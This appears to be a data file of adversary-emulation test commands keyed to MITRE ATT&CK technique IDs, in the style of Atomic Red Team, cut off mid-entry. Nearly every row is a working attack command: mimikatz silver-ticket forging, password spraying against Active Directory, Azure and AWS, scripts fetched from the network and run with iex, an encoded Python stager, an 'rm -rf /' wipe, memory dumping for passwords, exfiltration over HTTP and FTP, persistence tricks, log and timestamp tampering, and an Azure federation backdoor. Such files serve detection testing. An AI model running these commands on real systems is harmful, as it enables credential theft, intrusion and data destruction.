T1113,Windows Screencapture,"cmd /c start /b psr.exe /start /output #{output_file} /sc 1 /gui 0 /stopevent 12 add-type -memberdefinition '[dllimport(""user32.dll"")] public static extern void mouse_event(int flags, int dx, int dy, int cbuttons, int info);' -name u32 -namespace w; [w.u32]::mouse_event(0x02 -bor 0x04 -bor 0x01, 0, 0, 0, 0); cmd /c ""timeout #{recording_time} > null && psr.exe /stop"""
T1113,Windows Screen Capture (CopyFromScreen),"add-type -assemblyname system.windows.forms $screen = [windows.forms.systeminformation]::virtualscreen $bitmap = new-object drawing.bitmap $screen.width, $screen.height $graphic = [drawing.graphics]::fromimage($bitmap) $graphic.copyfromscreen($screen.left, $screen.top, 0, 0, $bitmap.size) $bitmap.save(""#{output_file}"")"
T1113,Windows Recall Feature Enabled - DisableAIDataAnalysis Value Deleted,"reg add ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /t reg_dword /d 0 /f reg delete ""hkey_current_user\software\policies\microsoft\windows\windowsai"" /v disableaidataanalysis /f"
T1558,Crafting Active Directory silver tickets with mimikatz,"remove-item $env:temp\silver.bat -erroraction ignore remove-item $env:temp\silver.txt -erroraction ignore # get current domain sid if default was used $domain_sid = ""#{domain_sid}"" if ($domain_sid -match ""default"") { # code from https://www.sevecek.com/englishpages/lists/posts/post.aspx?id=60 $domain = gwmi win32_computersystem | select -expand domain $krbtgtsid = (new-object security.principal.ntaccount $domain\krbtgt).translate([security.principal.securityidentifier]).value $domain_sid = $krbtgtsid.substring(0, $krbtgtsid.lastindexof('-')) } # create batch file with commands to run in a separate ""runas /netonly"" session # so we don't purge kerberos ticket from the current windows session # its output goes to silver.txt temp file, because we cannot capture ""runas /netonly"" output otherwise @"" >%temp%\silver.txt 2>&1 ( echo purge existing tickets and create silver ticket: klist purge #{mimikatz_path} ""kerberos::golden /domain:#{domain} /sid:domain_sid /aes256:#{service_aes256_key} /user:#{account} /service:host /target:#{target}.#{domain} /ptt"" ""exit"" echo. echo executing:schtasks /query /s #{target}.#{domain} schtasks /query /s #{target}.#{domain} echo. echo tickets after requesting schtasks: klist echo. echo end of silver ticket attack ) ""@ -replace ""domain_sid"", $domain_sid | out-file -encoding oem $env:temp\silver.bat # run batch file in a new empty session (password and username do not matter) echo ""foo"" | runas /netonly /user:fake ""$env:temp\silver.bat"" | out-null # wait until the output file has logged the entire attack do { start-sleep 1 # wait a bit so the output file has time to be created get-content -path ""$env:temp\silver.txt"" -wait | foreach-object { if ($_ -match 'end of silver ticket attack') { break } } } while ($false) # dummy loop so that 'break' can be used # show output from new empty session get-content $env:temp\silver.txt # cleanup temp files remove-item $env:temp\silver.bat -erroraction ignore remove-item $env:temp\silver.txt -erroraction ignore"
T1556,Malicious PAM rule,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1556,Malicious PAM rule (freebsd),"sudo sed -i """" ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1556,Malicious PAM module,"sudo sed -i ""#{index}s,^,#{pam_rule}\n,g"" #{path_to_pam_conf}"
T1110,Password Spray all Domain Users,"@for /f %n in (%temp%\users.txt) do @echo | set/p=. & @net use %logonserver%\ipc$ /user:""%userdomain%\%n"" ""#{password}"" 1>nul 2>&1 && @echo [*] %n:#{password} && @net use /delete %logonserver%\ipc$ > nul"
T1110,Password Spray (DomainPasswordSpray),[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr 'https://raw.githubusercontent.com/dafthack/domainpasswordspray/94cb72506b9e2768196c8b6a4b7af63cebc47d88/domainpasswordspray.ps1' -usebasicparsing); invoke-domainpasswordspray -password spring2017 -domain #{domain} -force
T1110,Password spray all Active Directory domain users with a single password via LDAP against domain controller (NTLM or Kerberos),"if (""#{auth}"".tolower() -notin @(""ntlm"",""kerberos"")) { write-host ""only 'ntlm' and 'kerberos' auth methods are supported"" exit 1 } $domainusers = get-aduser -ldapfilter '(&(samaccounttype=805306368)(!(useraccountcontrol:1.2.840.113556.1.4.803:=2)))' -server #{domain} | select-object -expandproperty samaccountname [system.reflection.assembly]::loadwithpartialname(""system.directoryservices.protocols"") | out-null $di = new-object system.directoryservices.protocols.ldapdirectoryidentifier(""#{domain}"",389) $domainusers | foreach-object { $user = $_ $password = '#{password}' $credz = new-object system.net.networkcredential($user, $password, ""#{domain}"") $conn = new-object system.directoryservices.protocols.ldapconnection($di, $credz, [system.directoryservices.protocols.authtype]::#{auth}) try { write-host "" [-] attempting ${password} on account ${user}."" $conn.bind() # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] ${user}:${password} are valid credentials!"" } catch { write-host $_.exception.message } } write-host ""end of password spraying"""
T1110,Password spray all Azure AD users with a single password,"import-module -name azuread $pword = convertto-securestring -string ""#{valid_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{valid_username}"", $pword connect-azuread -credential $credential > $null ($users = get-azureaduser -all $true) > $null disconnect-azuread > $null $pword = convertto-securestring -string ""#{password}"" -asplaintext -force $users | foreach-object { $user = $_.userprincipalname $credential = new-object -typename system.management.automation.pscredential -argumentlist ""$user"", $pword try { write-host "" [-] attempting #{password} on account ${user}."" connect-azuread -credential $credential 2>&1> $null # if credentials aren't correct, it will break just above and goes into catch block, so if we're here we can display success write-host "" [!] ${user}:#{password} are valid credentials!`r`n"" disconnect-azuread > $null } catch { write-host "" [-] ${user}:#{password} invalid credentials.`r`n"" } } write-host ""end of password spraying"""
T1110,WinPwn - DomainPasswordSpray Attacks,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') domainpassspray -consoleoutput -noninteractive -emptypasswords
T1110,Password Spray Invoke-DomainPasswordSpray Light,"function invoke-dpslight ($password, $userlist) { $users = get-content $userlist $domain = ""ldap://"" + ([adsi]"""").distinguishedname foreach ($user in $users) { $domain_check = new-object system.directoryservices.directoryentry($domain, $user, $password) if ($domain_check.name -ne $null) { write-host -foregroundcolor green ""password found for user:$user password:$password"" } else { write-host "". "" -nonewline} } write-host -foregroundcolor green ""finished"" } invoke-dpslight ""#{password}"" $env:temp\usersdpslight.txt"
T1110,Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365),"import-module ""pathtoatomicsfolder\..\externalpayloads\msolspray.ps1"" invoke-msolspray -userlist ""#{user_list}"" -password ""#{password}"""
T1110,Password Spray using Kerbrute Tool,"cd ""pathtoatomicsfolder\..\externalpayloads"" .\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} ""pathtoatomicsfolder\..\externalpayloads\passwordspray.txt"" password132"
T1110,AWS - Password Spray an AWS using GoAWSConsoleSpray,cd /tmp git clone git@github.com:whiteoaksecurity/goawsconsolespray.git cd /tmp/goawsconsolespray go run main.go goawsconsolespray -a #{aws_account_id} -u pathtoatomicsfolder/t1110.003/src/aws_users.txt -p pathtoatomicsfolder/t1110.003/src/aws_passwords.txt
T1574,User scope COR_PROFILER,"write-host ""creating registry keys in hkcu:software\classes\clsid\#{clsid_guid}"" -foregroundcolor cyan new-item -path ""hkcu:\software\classes\clsid\#{clsid_guid}\inprocserver32"" -value ""#{file_name}"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_profiler"" -propertytype string -value ""#{clsid_guid}"" -force | out-null new-itemproperty -path hkcu:\environment -name ""cor_profiler_path"" -propertytype string -value ""#{file_name}"" -force | out-null write-host ""executing eventvwr.msc"" -foregroundcolor cyan start mmc.exe eventvwr.msc"
T1574,System Scope COR_PROFILER,"write-host ""creating system environment variables"" -foregroundcolor cyan new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_enable_profiling"" -propertytype string -value ""1"" -force | out-null new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_profiler"" -propertytype string -value ""#{clsid_guid}"" -force | out-null new-itemproperty -path 'hklm:\system\currentcontrolset\control\session manager\environment' -name ""cor_profiler_path"" -propertytype string -value ""#{file_name}"" -force | out-null"
T1574,Registry-free process scope COR_PROFILER,"$env:cor_enable_profiling = 1 $env:cor_profiler = '#{clsid_guid}' $env:cor_profiler_path = '""#{file_name}""' powershell -c 'start-sleep 1'"
T1056,Hook PowerShell TLS Encrypt/Decrypt Messages,"mavinject $pid /injectrunning ""#{file_name}"" invoke-webrequest #{server_name} -usebasicparsing"
T1547,Persistence by modifying Windows Terminal profile,"mv #{settings_json_def} #{settings_json_tmp} invoke-webrequest ""https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/t1547.015/src/settings.json?raw=true"" -outfile ""#{settings_json_def}"" wt.exe"
T1547,Add macOS LoginItem using Applescript,osascript #{scriptfile}
T1546,Persistence via WMI Event Subscription - CommandLineEventConsumer,"$filterargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=new-ciminstance -namespace root/subscription -classname __eventfilter -property $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-commandlineeventconsumer-example'; commandlinetemplate=""$($env:systemroot)\system32\notepad.exe"";} $consumer=new-ciminstance -namespace root/subscription -classname commandlineeventconsumer -property $consumerargs $filtertoconsumerargs = @{ filter = [ref] $filter; consumer = [ref] $consumer; } $filtertoconsumerbinding = new-ciminstance -namespace root/subscription -classname __filtertoconsumerbinding -property $filtertoconsumerargs"
T1546,Persistence via WMI Event Subscription - ActiveScriptEventConsumer,"$filterargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; eventnamespace='root\cimv2'; querylanguage=""wql""; query=""select * from __instancemodificationevent within 60 where targetinstance isa 'win32_perfformatteddata_perfos_system' and targetinstance.systemuptime >= 240 and targetinstance.systemuptime < 325""}; $filter=set-wmiinstance -class __eventfilter -namespace ""root\subscription"" -arguments $filterargs $consumerargs = @{name='atomicredteam-wmipersistence-activescripteventconsumer-example'; scriptingengine='vbscript'; scripttext=' set objws = createobject(""wscript.shell"") objws.run ""notepad.exe"", 0, true '} $consumer=set-wmiinstance -namespace ""root\subscription"" -class activescripteventconsumer -arguments $consumerargs $filtertoconsumerargs = @{ filter = $filter; consumer = $consumer; } $filtertoconsumerbinding = set-wmiinstance -namespace 'root/subscription' -class '__filtertoconsumerbinding' -arguments $filtertoconsumerargs"
T1546,Windows MOFComp.exe Load MOF File,"#{mofcomp_path} ""#{mof_file}"""
T1020,IcedID Botnet HTTP PUT,"$filename = ""#{file}"" $url = ""#{domain}"" $file = new-item -force $filename -value ""this is art icedid botnet exfil test"" $contenttype = ""application/octet-stream"" try {invoke-webrequest -uri $url -method put -contenttype $contenttype -infile $filename} catch{}"
T1020,Exfiltration via Encrypted FTP,"$sampledata = ""sample data for exfiltration test"" set-content -path ""#{samplefile}"" -value $sampledata $ftpurl = ""#{ftpserver}"" $creds = get-credential -credential ""#{credentials}"" invoke-webrequest -uri $ftpurl -method put -infile ""#{samplefile}"" -credential $creds"
T1552,Enumeration for Credentials in Registry,reg query hklm /f password /t reg_sz /s reg query hkcu /f password /t reg_sz /s
T1552,Enumeration for PuTTY Credentials in Registry,reg query hkcu\software\simontatham\putty\sessions /t reg_sz /s
T1059,AppleScript,"osascript -e ""do shell script \""echo \\\""import sys,base64,warnings;warnings.filterwarnings('ignore');exec(base64.b64decode('aw1wb3j0ihn5cztpbxbvcnqgcmusihn1ynbyb2nlc3m7y21kid0ginbzic1lzib8igdyzxagtgl0dgxlxcbtbml0y2ggfcbncmvwic12igdyzxaicnbzid0gc3vichjvy2vzcy5qb3blbihjbwqsihnozwxspvrydwusihn0zg91dd1zdwjwcm9jzxnzllbjueupcm91dca9ihbzlnn0zg91dc5yzwfkkckkchmuc3rkb3v0lmnsb3nlkckkawygcmuuc2vhcmnokcjmaxr0bgugu25pdgnoiiwgb3v0ktokicagc3lzlmv4axqokqppbxbvcnqgdxjsbglimjskvue9j01vemlsbgevns4wichxaw5kb3dzie5uidyumtsgv09xnjq7ifryawrlbnqvny4woybydjoxms4wksbsawtliedly2tvjztzzxj2zxi9j2h0dha6ly8xmjcumc4wlje6odano3q9jy9sb2dpbi9wcm9jzxnzlnboccc7cmvxpxvybgxpyjiuumvxdwvzdchzzxj2zxirdck7cnjlcs5hzgrfagvhzgvykcdvc2vylufnzw50jyxvqsk7cnjlcs5hzgrfagvhzgvykcddb29rawunlcjzzxnzaw9upxqzvmhwt3mvrhldy0rurnpjs2fuunhrdmszst0iktskchjvehkgpsb1cmxsawiyllbyb3h5sgfuzgxlcigpowpvid0gdxjsbglimi5idwlszf9vcgvuzxiochjvehkpowp1cmxsawiylmluc3rhbgxfb3blbmvykg8powphpxvybgxpyjiudxjsb3blbihyzxesdgltzw91dd0zks5yzwfkkck7cg=='));\\\"" | python &\"""""
T1484,Add Federation to Azure AD,"import-module azuread import-module aadinternals $pword = convertto-securestring -string ""#{azure_password}"" -asplaintext -force $credential = new-object -typename system.management.automation.pscredential -argumentlist ""#{azure_username}"", $pword try { connect-azuread -credential $credential -erroraction stop > $null } catch { write-host ""error: azuread could not connect"" exit 1 } try { $domain = get-azureaddomain -name ""#{domain_name}"" } catch { write-host ""error: domain """"#{domain_name}"""" not found"" exit 1 } if (-not $domain.isverified) { write-host ""error: domain """"#{domain_name}"""" not verified"" exit 1 } if ($domain.authenticationtype -eq ""federated"") { write-host ""error: domain """"#{domain_name}"""" already federated. try with a different domain or re-create it before."" exit 1 } $at = get-aadintaccesstokenforaadgraph -credentials $credential if (-not $at) { write-host ""error: aadinternals could not connect"" exit 1 } $new = convertto-aadintbackdoor -accesstoken $at -domainname ""#{domain_name}"" if ($new) { write-host ""federation successfully added to azure ad"" write-host $new } else { write-host ""the federation setup failed"" } write-host ""end of federation configuration."""
T1127,Lolbin Jsc.exe compile javascript to exe,"copy ""#{filename}"" %temp%\hello.js #{jscpath}\#{jscname} %temp%\hello.js"
T1127,Lolbin Jsc.exe compile javascript to dll,"copy ""#{filename}"" %temp%\libhello.js #{jscpath}\#{jscname} /t:library %temp%\libhello.js"
T1553,Mount ISO image,"mount-diskimage -imagepath ""#{path_of_iso}"""
T1553,Mount an ISO image and run executable from the ISO,"mount-diskimage -imagepath ""#{path_of_iso}"" -storagetype iso -access readonly $keep = get-volume -filesystemlabel ""testiso"" $driveletter = ($keep | get-volume).driveletter invoke-item ""$($driveletter):\hello.exe"""
T1553,Remove the Zone.Identifier alternate data stream,unblock-file -path #{file_path}
T1553,Execute LNK file from ISO,"mount-diskimage -imagepath ""#{path_of_iso}"" -storagetype iso -access readonly $keep = get-volume -filesystemlabel ""allthethings"" $driveletter = ($keep | get-volume).driveletter $instance = [activator]::createinstance([type]::gettypefromclsid(""{c08afd90-f2a1-11d1-8455-00a0c91f3880}"")) $instance.document.application.shellexecute($driveletter+"":\document.lnk"","""",$driveletter+"":\"",$null,0)"
T1070,Delete a single file - FreeBSD/Linux/macOS,rm -f #{file_to_delete}
T1070,Delete an entire folder - FreeBSD/Linux/macOS,rm -rf #{folder_to_delete}
T1070,Overwrite and delete a file with shred,shred -u #{file_to_shred}
T1070,Delete a single file - Windows cmd,del /f #{file_to_delete}
T1070,Delete an entire folder - Windows cmd,rmdir /s /q #{folder_to_delete}
T1070,Delete a single file - Windows PowerShell,remove-item -path #{file_to_delete}
T1070,Delete an entire folder - Windows PowerShell,remove-item -path #{folder_to_delete} -recurse
T1070,Delete Filesystem - Linux,"[ ""$(uname)"" = 'linux' ] && rm -rf / --no-preserve-root > /dev/null 2> /dev/null || chflags -r 0 / && rm -rf / > /dev/null 2> /dev/null"
T1070,Delete Prefetch File,"remove-item -path (join-path ""$env:systemroot\prefetch\"" (get-childitem -path ""$env:systemroot\prefetch\*.pf"" -name)[0])"
T1070,Delete TeamViewer Log Files,new-item -path #{teamviewer_log_file} -force | out-null remove-item #{teamviewer_log_file} -force -erroraction ignore
T1070,Clears Recycle bin via rd,rd /s /q %systemdrive%\$recycle.bin
T1553,Gatekeeper Bypass,xattr -d com.apple.quarantine #{app_path}
T1485,Windows - Overwrite file with SysInternals SDelete,"if (-not (test-path ""#{file_to_delete}"")) { new-item ""#{file_to_delete}"" -force } & ""#{sdelete_exe}"" -accepteula ""#{file_to_delete}"""
T1485,FreeBSD/macOS/Linux - Overwrite file with DD,dd of=#{file_to_overwrite} if=#{overwrite_source} count=$(ls -l #{file_to_overwrite} | awk '{print $5}') iflag=count_bytes
T1485,Overwrite deleted data on C drive,cipher.exe /w:c:
T1485,GCP - Delete Bucket,gcloud config set project #{project_id} gcloud storage buckets delete gs://#{bucket_name}
T1485,ESXi - Delete VM Snapshots,"echo """" | ""#{plink_file}"" -batch ""#{vm_host}"" -ssh -l #{vm_user} -pw ""#{vm_pass}"" ""for i in `vim-cmd vmsvc/getallvms | awk 'nr>1 {print $1}'`; do vim-cmd vmsvc/snapshot.removeall $i & done"""
T1133,Running Chrome VPN Extensions via the Registry 2 vpn extension,"$extlist = #{extension_id} foreach ($extension in $extlist) { new-item -path hklm:\software\wow6432node\google\chrome\extensions\$extension -force new-itemproperty -path ""hklm:\software\wow6432node\google\chrome\extensions\$extension"" -name ""update_url"" -value ""https://clients2.google.com/service/update2/crx"" -propertytype ""string"" -force} start chrome start-sleep -seconds 30 stop-process -name ""chrome"""
T1021,Map admin share,"cmd.exe /c ""net use \\#{computer_name}\#{share_name} #{password} /u:#{user_name}"""
T1021,Map Admin Share PowerShell,new-psdrive -name #{map_name} -psprovider filesystem -root \\#{computer_name}\#{share_name}
T1021,Copy and Execute File with PsExec,"""#{psexec_exe}"" #{remote_host} -accepteula -c #{command_path}"
T1021,Execute command writing output to local Admin Share,cmd.exe /q /c #{command_to_execute} 1> \\127.0.0.1\admin$\#{output_file} 2>&1
T1564,Alternate Data Streams (ADS),"type c:\temp\evil.exe > ""c:\program files (x86)\teamviewer\teamviewer12_logfile.log:evil.exe"" extrac32 #{path}\procexp.cab #{path}\file.txt:procexp.exe findstr /v /l w3alllov3donaldtrump #{path}\procexp.exe > #{path}\file.txt:procexp.exe certutil.exe -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1564.004/src/test.ps1 c:\temp:ttt makecab #{path}\autoruns.exe #{path}\cabtest.txt:autoruns.cab print /d:#{path}\file.txt:autoruns.exe #{path}\autoruns.exe reg export hklm\software\microsoft\evilreg #{path}\file.txt:evilreg.reg regedit /e #{path}\file.txt:regfile.reg hkey_current_user\mycustomregkey expand \\webdav\folder\file.bat #{path}\file.txt:file.bat esentutl.exe /y #{path}\autoruns.exe /d #{path}\file.txt:autoruns.exe /o"
T1564,Store file in Alternate Data Stream (ADS),"if (!(test-path c:\users\public\libraries\yanki -pathtype container)) { new-item -itemtype directory -force -path c:\users\public\libraries\yanki } start-process -filepath ""$env:comspec"" -argumentlist ""/c,type,#{payload_path},>,`""#{ads_file_path}:#{ads_name}`"""""
T1564,Create ADS command prompt,"echo cmd /c echo ""shell code execution.""> #{file_name}:#{ads_filename} for /f ""usebackq delims=?"" %i in (#{file_name}:#{ads_filename}) do %i"
T1564,Create ADS PowerShell,"echo ""test"" > #{file_name} | set-content -path test.txt -stream #{ads_filename} -value ""test"" set-content -path #{file_name} -stream #{ads_filename} -value ""test2"" set-content -path . -stream #{ads_filename} -value ""test3"""
T1564,Create Hidden Directory via $index_allocation,md #{folder_name} echo too many secrets > #{folder_name}\#{hidden_filename}
T1090,Connection Proxy,export #{proxy_scheme}_proxy=#{proxy_server}:#{proxy_port} curl #{test_url}
T1090,Connection Proxy for macOS UI,networksetup -setwebproxy #{interface} #{proxy_server} #{proxy_port} networksetup -setsecurewebproxy #{interface} #{proxy_server} #{proxy_port}
T1090,portproxy reg key,netsh interface portproxy add v4tov4 listenport=#{listenport} connectport=#{connectport} connectaddress=#{connectaddress}
T1654,Get-EventLog To Enumerate Windows Security Log,powershell -c {get-eventlog 'security' | where {$_.message -like '*system*'} | export-csv $env:temp\t1654_events.txt}
T1654,Enumerate Windows Security Log via WevtUtil,wevtutil enum-logs
T1047,WMI Reconnaissance Users,wmic useraccount get /all /format:csv
T1047,WMI Reconnaissance Processes,"wmic process get caption,executablepath,commandline /format:csv"
T1047,WMI Reconnaissance Software,"wmic qfe get description,installedon /format:csv"
T1047,WMI Reconnaissance List Remote Services,"wmic /node:""#{node}"" service where (caption like ""%#{service_search_string}%"")"
T1047,WMI Execute Local Process,wmic process call create #{process_to_execute}
T1047,WMI Execute Remote Process,"wmic /user:#{user_name} /password:#{password} /node:""#{node}"" process call create #{process_to_execute}"
T1047,Create a Process using WMI Query and an Encoded Command,powershell -exec bypass -e sqbuahyabwbragualqbxag0aaqbnaguadaboag8azaagac0auabhahqaaaagahcaaqbuadmamgbfahaacgbvagmazqbzahmaiaatae4ayqbtaguaiabjahiazqbhahqazqagac0aqqbyagcadqbtaguabgb0aewaaqbzahqaiabuag8adablahaayqbkac4azqb4agua
T1047,Create a Process using obfuscated Win32_Process,"$class = new-object management.managementclass(new-object management.managementpath(""win32_process"")) $newclass = $class.derive(""#{new_class}"") $newclass.put() invoke-wmimethod -path #{new_class} -name create -argumentlist #{process_to_execute}"
T1047,WMI Execute rundll32,"wmic /node:#{node} process call create ""rundll32.exe \""#{dll_to_execute}\"" #{function_to_execute}"""
T1047,Application uninstall using WMIC,"wmic /node:""#{node}"" product where ""name like '#{product}%%'"" call uninstall"
T1547,Shortcut Modification,echo [internetshortcut] > #{shortcut_file_path} echo url=c:\windows\system32\calc.exe >> #{shortcut_file_path} #{shortcut_file_path}
T1547,Create shortcut to cmd in startup folders,"$shell = new-object -comobject (""wscript.shell"") $shortcut = $shell.createshortcut(""$env:appdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk"") $shortcut.targetpath=""cmd.exe"" $shortcut.workingdirectory = ""c:\windows\system32""; $shortcut.windowstyle = 1; $shortcut.description = ""t1547.009.""; $shortcut.save() $shell = new-object -comobject (""wscript.shell"") $shortcut = $shell.createshortcut(""$env:programdata\microsoft\windows\start menu\programs\startup\t1547.009.lnk"") $shortcut.targetpath=""cmd.exe"" $shortcut.workingdirectory = ""c:\windows\system32""; $shortcut.windowstyle = 1; $shortcut.description = ""t1547.009.""; $shortcut.save()"
T1546,Trap EXIT,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'"
T1546,Trap EXIT (freebsd),"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" exit'"
T1546,Trap SIGINT,"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" sigint && kill -sigint $$'"
T1546,Trap SIGINT (freebsd),"bash -c 'trap ""nohup sh $pathtoatomicsfolder/t1546.005/src/echo-art-fish.sh"" sigint && kill -sigint $$'"
T1546,Application Shim Installation,"sdbinst.exe ""#{file_path}"""
T1546,New shim database files created in the default shim database directory,"copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\t1546.011compatdatabase.sdb copy-item ""$pathtoatomicsfolder\t1546.011\bin\t1546.011compatdatabase.sdb"" c:\windows\apppatch\custom\custom64\t1546.011compatdatabase.sdb"
T1546,Registry key creation and/or modification events for SDB,"new-itemproperty -path hklm:""\software\microsoft\windows nt\currentversion\appcompatflags\custom"" -name ""atomicredteamt1546.011"" -value ""atomicredteamt1546.011"" new-itemproperty -path hklm:""\software\microsoft\windows nt\currentversion\appcompatflags\installedsdb"" -name ""atomicredteamt1546.011"" -value ""atomicredteamt1546.011"""
T1114,Email Collection with PowerShell Get-Inbox,"powershell -executionpolicy bypass -command ""#{file_path}\get-inbox.ps1"" -file #{output_file}"
T1620,WinPwn - Reflectively load Mimik@tz into memory,iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/s3cur3th1ssh1t/winpwn/121dcee26a7aca368821563cbe92b2b5638c5773/winpwn.ps1') mimiload -consoleoutput -noninteractive
T1003,Dump individual process memory with sh (Local),"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") heap_mem=$(grep -e ""^[0-9a-f-]* r"" /proc/""$pid""/maps | grep heap | cut -d' ' -f 1) mem_start=$(echo $((0x$(echo ""$heap_mem"" | cut -d""-"" -f1)))) mem_stop=$(echo $((0x$(echo ""$heap_mem"" | cut -d""-"" -f2)))) mem_size=$(echo $((0x$mem_stop-0x$mem_start))) dd if=/proc/""${pid}""/mem of=""#{output_file}"" ibs=1 skip=""$mem_start"" count=""$mem_size"" grep -i ""pass"" ""#{output_file}"""
T1003,Dump individual process memory with sh on FreeBSD (Local),"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") mem_start=$(head -n 5 /proc/""${pid}""/map | tail -1 | cut -d' ' -f1) mem_stop=$(head -n 5 /proc/""${pid}""/map | tail -1 | cut -d' ' -f2) mem_size=$(echo $(($mem_stop-$mem_start))) dd if=/proc/""${pid}""/mem of=""#{output_file}"" ibs=1 skip=""$mem_start"" count=""$mem_size"" strings ""#{output_file}"" | grep -i pass"
T1003,Dump individual process memory with Python (Local),"sh #{script_path} pid=$(pgrep -n -f ""#{pid_term}"") python=$(which python || which python3 || which python2) $python #{python_script} $pid #{output_file} grep -i ""pass"" ""#{output_file}"""
T1003,Capture Passwords with MimiPenguin,sudo #{mimipenguin_location} > #{output_file} cat #{output_file}
T1016,Check internet connection using ping Windows,ping -n 4 #{ping_target}
T1016,"Check internet connection using ping freebsd, linux or macos",ping -c 4 #{ping_target}
T1016,Check internet connection using Test-NetConnection in PowerShell (ICMP-Ping),test-netconnection -computername #{target}
T1016,Check internet connection using Test-NetConnection in PowerShell (TCP-HTTP),test-netconnection -commontcpport http -computername #{target}
T1016,Check internet connection using Test-NetConnection in PowerShell (TCP-SMB),test-netconnection -commontcpport smb -computername #{target}
T1037,Logon Scripts,"echo ""#{script_command}"" > #{script_path} reg.exe add hkcu\environment /v userinitmprlogonscript /t reg_sz /d ""#{script_path}"" /f"
T1546,Persistance with Event Monitor - emond,"sudo cp ""#{plist}"" /etc/emond.d/rules/t1546.014_emond.plist sudo touch /private/var/db/emondclients/t1546.014"
T1547,Add a driver,"pnputil.exe /add-driver ""#{driver_inf}"""
T1547,Driver Installation Using pnputil.exe,pnputil.exe -i -a #{driver_path}
T1547,Leverage Virtual Channels to execute custom DLL during successful RDP session,"reg add ""hkey_current_user\software\microsoft\terminal server client\default\addins\#{subkey_added}"" /v name /t reg_sz /d ""#{dll_inf}"" /f"
T1055,Thread Execution Hijacking,"$notepad = start-process notepad -passthru start-process ""$pathtoatomicsfolder\t1055.003\bin\injectcontext.exe"" start-sleep -seconds 5 stop-process $notepad.id"
T1070,Set a file's access timestamp,touch -a -t 197001010000.00 #{target_filename}
T1070,Set a file's modification timestamp,touch -m -t 197001010000.00 #{target_filename}
T1070,Set a file's creation timestamp,"now=$(date +%m%d%h%m%y) date 010100001971 touch #{target_filename} date ""$now"" stat #{target_filename}"
T1070,Modify file timestamps using reference file,touch #{target_file_path} touch -acmr #{reference_file_path} #{target_file_path}
T1070,Windows - Modify file creation timestamp with PowerShell,"get-childitem ""#{file_path}"" | % { $_.creationtime = ""#{target_date_time}"" }"
T1070,Windows - Modify file last modified timestamp with PowerShell,"get-childitem ""#{file_path}"" | % { $_.lastwritetime = ""#{target_date_time}"" }"
T1070,Windows - Modify file last access timestamp with PowerShell,"get-childitem ""#{file_path}"" | % { $_.lastaccesstime = ""#{target_date_time}"" }"
T1070,Windows - Timestomp a File,"import-module ""#{file_path}\timestomp.ps1"" timestomp -dest ""#{file_path}\kxwn.lock"""
T1070,MacOS - Timestomp Date Modified,setfile -m #{target_date} #{target_filename}
T1070,Event Log Manipulations- Time slipping via Powershell,"try{ set-date -date (get-date).adddays(#{days_to_modify}) add-content ""$env:appdata\slipdays.bak"" #{days_to_modify} } catch {exit 1}"
T1530,AWS - Scan for Anonymous Access to S3,aws --no-sign-request s3 cp --recursive s3://#{s3_bucket_name} /tmp/#{s3_bucket_name}
T1530,Azure - Dump Azure Storage Account Objects via Azure CLI,"$storage_account_objects = import-csv -path ""#{storage_account_objects_csv_file_path}"" # login to azure az login if (-not (test-path -path ""#{output_folder}"")) { new-item -itemtype directory -path ""#{output_folder}"" } foreach ($row in $storage_account_objects) { if ($row.filesharename -ne """"){ $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this storage account."" } else { write-output ""fetching content from file share: $($row.filesharename) in storage account $($row.storageaccountname) ..."" $connectionstring = az storage account show-connection-string --name $row.storageaccountname --resource-group $row.resourcegroup --query connectionstring --output tsv # create folder for storage account objects $storageaccountoutputpath = join-path #{output_folder} ""$($row.resourcegroup)_$($row.storageaccountname)"" if (-not (test-path -path $storageaccountoutputpath)) { new-item -itemtype directory -path $storageaccountoutputpath } # create folder for file share content $filesharepath = join-path -path $storageaccountoutputpath $row.filesharename if (-not (test-path -path $filesharepath)) { new-item -itemtype directory -path $filesharepath } az storage file download-batch --connection-string $connectionstring --source $row.filesharename --destination $filesharepath } } elseif ($row.containername -ne """" -and $row.blobname -eq """") { $allowsharedkeyaccess = az storage account show --name $row.storageaccountname --resource-group $row.resourcegroup --query ""allowsharedkeyaccess"" if ($allowsharedkeyaccess -eq ""false"") { # $allowsharedkeyaccess could be true or null write-output ""shared key access is disabled for this 